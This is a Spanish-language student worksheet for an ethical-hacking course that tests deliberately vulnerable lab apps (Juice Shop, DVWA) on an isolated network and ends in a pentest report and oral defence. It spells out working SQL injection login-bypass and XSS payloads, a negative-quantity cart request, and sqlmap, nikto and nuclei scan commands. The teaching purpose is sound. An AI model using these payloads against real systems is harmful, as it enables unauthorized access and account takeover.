# HE UT8 · Ficha 02 (alumnado) — Lógica, inyección, automatización verificada e informe

**Módulo** 5025 Hacking Ético · **UT8** (sesión 2 de 2) · **RA5 CE d, e, f**.
**Evidencias que produce**: **HE-E15** (informe, I2/R2) y **HE-E16** (defensa oral, I4/R4).
**Continúa** la ficha 01. Mismos objetivos y mismas reglas de aula (VLAN aislada, salida cero).

---

## §1 — WSTG II: lógica de negocio + sesión (RA5.d) · RETO en parejas

**A) Lógica de negocio (WSTG-BUSL)** — cantidad negativa en la cesta de Juice Shop:
```bash
TOKEN='TU_JWT'
# Localiza el id de un item de tu cesta (BasketItem) navegando la cesta con el proxy.
curl -s -X PUT http://juice.xest.local:3000/api/BasketItems/7 \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"quantity": -100}' | jq '.data | {id:.id, quantity:.quantity}'
```
¿Acepta la cantidad negativa? ¿Qué le pasa al importe del pedido?

**B) Sesión (WSTG-SESS)**:
- ¿El JWT **expira**? Reutiliza un token de hace horas y comprueba si sigue válido.
- ¿Se **rota** el token tras cambiar la contraseña? (fijación de sesión).
- Si el objetivo usa cookie (revisa portal-soc tras el bastionado de PPS): flags
  `HttpOnly`, `Secure`, `SameSite`.

Documenta **1 fallo de lógica + 1 hallazgo de sesión** con evidencia.

---

## §2 — WSTG III: inyección SQL + XSS (RA5.d)

**A) SQLi — bypass de login en Juice Shop (WSTG-INPV-05)**:
```bash
curl -s http://juice.xest.local:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' | jq '.authentication | {umail, token}'
```
¿Obtienes un token? ¿De qué usuario? (pista: el primero de la tabla suele ser el admin).

**B) SQLi en DVWA — el antes/después**:
```
# DVWA -> SQL Injection, campo id, nivel low:
1' OR '1'='1
# Luego sube DVWA_SECURITY a 'high' y repite: ¿sigue funcionando?
```

**C) XSS (WSTG-INPV-01/02)**:
- Reflejado en DVWA (low): `<script>alert(document.domain)</script>`
- DOM en Juice Shop (buscador): `` <iframe src="javascript:alert(`xss`)"> ``

Evidencia = captura del `alert` con el dominio del objetivo. Remediación: codificación de
salida + Content-Security-Policy (¡la que faltaba en el §1 de la ficha 01!).

---

## §3 — Automatización CON verificación (RA5.e, f)

```bash
nuclei -u http://portal-soc.xest.local:8080 -severity low,medium,high,critical
nikto -host http://portal-soc.xest.local:8080
sqlmap -u "http://juice.xest.local:3000/rest/products/search?q=test" --batch --level 2 --risk 1
```

Rellena la **tabla de contraste** (es lo que evalúa RA5.f):

| Hallazgo | ¿Lo encontró el humano? | ¿Lo encontró la máquina? | ¿Verificado a mano? | Veredicto |
|---|:--:|:--:|:--:|---|
| IDOR cesta | | | | |
| SQLi login | | | | |
| Cabeceras ausentes | | | | |
| Lógica (cantidad negativa) | | | | |
| (línea de nikto a elegir) | | | | ¿falso positivo? |

**Regla dura**: un hallazgo que solo encontró la máquina y **no** verificaste a mano **no
entra** en el informe. Debes tener **al menos uno** que solo encontró el humano.

**Flujo autenticado con Selenium**:
```bash
# Registra el usuario de prueba (una vez):
curl -s http://juice.xest.local:3000/api/Users/ -H 'Content-Type: application/json' \
  -d '{"email":"selenium@xest.local","password":"Xest.2027","passwordRepeat":"Xest.2027","securityQuestion":{"id":1},"securityAnswer":"lab"}' >/dev/null
# Ejecuta el flujo:
python3 selenium_flujo_login.py --url http://juice.xest.local:3000 \
  --email selenium@xest.local --password 'Xest.2027' --headless
```
Lee el script: entiende cómo automatiza el login y extrae el token. No es una caja negra.

---

## §4 — Montar HE-E15 (informe, rúbrica R2)

Sobre `HE/material/plantillas/informe-pentest.md`, entrega `NN-HE-E15-auditoria-web.pdf` con:

1. **Resumen ejecutivo** (1 pág, sin jerga): semáforo + 3 riesgos top + recomendación.
2. **Alcance y metodología**: WSTG 4.2, caja gris, referencia al ROE.
3. **Tabla de hallazgos** priorizada por **explotabilidad real** (no por nota automática).
4. **Hallazgos detallados** con evidencia reproducible + remediación (CWE) + prioridad.
5. **Matriz probabilidad × impacto** y anexo IoC para el equipo azul (IC).

Prioridad sugerida: crítico (SQLi login, IDOR datos de clientes) · medio (lógica, XSS) ·
bajo (cabeceras ausentes, banner de versión). **Justifica** cada nivel.

## §5 — Preparar HE-E16 (defensa, rúbrica R4)

Elige tu hallazgo crítico (recomendado: SQLi con bypass de autenticación). En ≤10 min:
- Traduce el impacto técnico a **consecuencia de negocio**.
- **PoC en vivo** con plan B (captura grabada por si el laboratorio falla).
- Remediación verificable + explicita **alcance y autorización** sin que te lo pregunten.

## Checklist de salida (sesión 2)

- [ ] 1 fallo de lógica + 1 de sesión evidenciados.
- [ ] 1 SQLi (con antes/después en DVWA) + 1 XSS evidenciados.
- [ ] Tabla de contraste humano↔máquina completa, con ≥1 hallazgo solo-humano.
- [ ] Flujo Selenium ejecutado.
- [ ] Informe HE-E15 montado sobre la plantilla.
- [ ] Hallazgo crítico elegido y defensa HE-E16 preparada.
